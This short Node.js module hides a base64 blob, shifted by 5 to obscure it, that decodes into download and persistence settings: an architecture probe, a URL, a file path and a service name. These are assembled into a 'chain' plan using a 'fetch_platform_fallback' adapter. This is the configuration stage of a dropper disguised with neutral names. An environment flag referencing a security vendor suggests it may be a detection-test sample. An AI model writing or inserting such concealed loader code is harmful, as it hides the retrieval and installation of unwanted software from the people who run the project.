const moduleShape = Object.freeze({ format: "commonjs" });

const Material_10f8ccf1 = "e0I2gXh5anV4QnV3dGtucWpkbXR4eTFmaHZ6bndqZHdqcnR5ajF8d255amRrbnFqMWhtZnNsamRydGlqMWlueHVmeWhtZHV3dGhqeHiBZmlmdXlqd0JranlobWR1cWZ5a3R3cmRrZnFxZ2ZocIF4eWZsamRodHpzeUI6gWhmcnVmbmxzZG5pQlNUSUoyRz49NUs1STWBendxQm15eXV4PzQ0c3RpajJnPj01azVpNTw2Ojszan1mcnVxajNuc3tmcW5pNGZ1boF6eGp3ZGZsanN5QlN0aWpGemlueTRnPj01gWtucWpkdWZ5bUI0eXJ1NG16c3l3anh4MnN0aWo0M3h5ZmxqMmc+PTVrNWk1PDY6OzNyb3iBZndobWR1d3RnakJ1d3Roanh4M2Z3aG2BeGp3e25oamRzZnJqQnN0aWoyZz49NWs1M3hqd3tuaGo=";

const Codec_10f8ccf1 = "base64_chunks|add_modulo_256|05";



function load_10f8ccf1() { return [...Buffer.from(Material_10f8ccf1, "base64")]; }

function decode_10f8ccf1(EnCoDeD) { return EnCoDeD.map((value) => (value - 5 + 256) & 255); }

async function recover_10f8ccf1() {

  const NeUtRaL = ["north", "south"].join(":");

  const EnCoDeD = load_10f8ccf1(); let DeCoDeD = [];

  DeCoDeD = decode_10f8ccf1(EnCoDeD);

  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");

}

async function inspect_10f8ccf1() { return ({ ...{ value: await recover_10f8ccf1() } }).value; }

async function plan_10f8ccf1() { const inspect = inspect_10f8ccf1; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "chain", adapter: "fetch_platform_fallback", arch: fields.arch_probe, url: fields.url, path: fields.file_path, service: fields.service_name }); }

void moduleShape; void plan_10f8ccf1;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_10f8ccf1());

